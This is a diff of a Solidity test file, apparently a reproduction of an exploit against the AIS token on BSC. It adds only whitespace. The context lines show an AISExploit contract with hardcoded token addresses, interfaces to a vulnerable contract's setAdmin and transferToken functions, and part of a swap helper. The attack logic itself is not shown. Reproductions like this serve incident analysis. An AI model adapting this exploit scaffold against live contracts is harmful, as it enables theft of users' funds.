@@ -18,16 +18,21 @@ import "./../interface.sol";
 // https://twitter.com/Phalcon_xyz/status/1729861048004391306
 
 interface IAIS is IERC20 {
+
     function setSwapPairs(address _address) external;
     function harvestMarket() external;
+
 }
 
 interface VulContract {
+
     function setAdmin(address _admin) external;
     function transferToken(address _from, address _to, uint256 _tokenId) external;
+
 }
 
 contract AISExploit is Test {
+
     IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IAIS AIS = IAIS(0x6844Ef18012A383c14E9a76a93602616EE9d6132);
 
@@ -90,4 +95,5 @@ contract AISExploit is Test {
         path[1] = tokenOut;
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, address(this), block.timestamp);
     }
+
 }
